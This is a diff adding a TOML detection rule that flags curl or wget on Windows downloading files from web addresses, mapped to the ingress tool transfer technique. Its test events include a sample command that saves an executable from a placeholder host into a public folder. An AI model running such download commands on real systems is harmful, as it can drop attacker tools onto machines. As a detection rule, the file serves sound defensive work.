@@ -1,0 +1,28 @@
+[rule]
+id = "etap-018"
+name = "curl or wget Downloading From a Web Address"
+description = "curl.exe or wget.exe fetching a file from the internet from inside a suspicious sample."
+version = "1"
+author = "E-TAP team"
+license = "MIT"
+os_list = ["windows"]
+query = '''process where
+  process.name in~ ("curl.exe", "wget.exe")
+  and process.command_line : ("http://", "https://", "ftp://")
+'''
+
+[[threat]]
+tactic.name = "Command and Control"
+[[threat.technique]]
+id = "T1105"
+name = "Ingress Tool Transfer"
+
+[[tests]]
+name = "curl download"
+expect = "match"
+event = { _category = "process", event = { action = "start" }, process = { name = "curl.exe", executable = "C:\\Windows\\System32\\curl.exe", command_line = "curl.exe -o C:\\Users\\Public\\a.exe https://example.test/a.exe" } }
+
+[[tests]]
+name = "version check"
+expect = "no_match"
+event = { _category = "process", event = { action = "start" }, process = { name = "curl.exe", executable = "C:\\Windows\\System32\\curl.exe", command_line = "curl.exe --version" } }
